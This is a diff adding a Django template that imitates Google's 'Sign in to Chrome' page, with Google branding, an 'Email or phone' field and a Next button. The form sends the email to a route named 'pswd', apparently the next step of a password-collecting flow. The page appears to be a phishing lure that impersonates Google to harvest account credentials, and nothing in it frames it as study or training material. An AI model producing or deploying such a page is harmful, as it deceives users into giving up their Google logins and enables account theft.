@@ -1,0 +1,46 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<div class="container-fluid ">
+    <form action="{% url 'pswd' %}" method="get">
+        <div class="container-fluid border border-1 p-3" style="height: 90%; width: 80%;">
+            <div class="d-flex justify-content-center">
+                <img src="/media/google.webp" alt="" class="d-flex justify-content-center img-fluid"
+                    style="height: 60px; width: 100px;">
+            </div>
+            <div>
+                <p class="text-center fs-4 fluid">Sign in to Chrome{{'<br>'}}<span class="fs-6">Use your Google
+                        Account</span></p>
+            </div>
+            <div>
+
+
+                <input type="text " class="form-control" name="em" id="" required="" placeholder="Email or phone">
+
+            </div>
+            <p class="text-primary mb-4" style="color:dodgerblue;">Forget email?</p>
+            <p>Not your computer? Use Guest mode to sign in privately</p>
+            <p class="text-primary">Learn more</p>
+            <div class="mt-5 d-flex ">
+                <p class="text-primary ">Create account</p>
+
+
+
+                <button type="submit" class="btn text-light mx-5" 
+                    style=" background-color:rgb(30, 101, 255);">Next</button>
+
+
+            </div>
+        </div>
+        <div class="container-fluid border border-0 p-3 d-flex" style="height: 90%; width: 80%;">
+            <p class=" dropdown-toggle">English(UnitedStates) </p>
+            <p class=" mx-lg-5"></p>
+            <div class="d-flex px-3">
+                <p class="mx-2 ">help</p>
+                <p class="mx-1">privacy</p>
+                <p class="mx-1">term</p>
+            </div>
+        </div>
+    </form>
+</div>
+{% endblock content %}
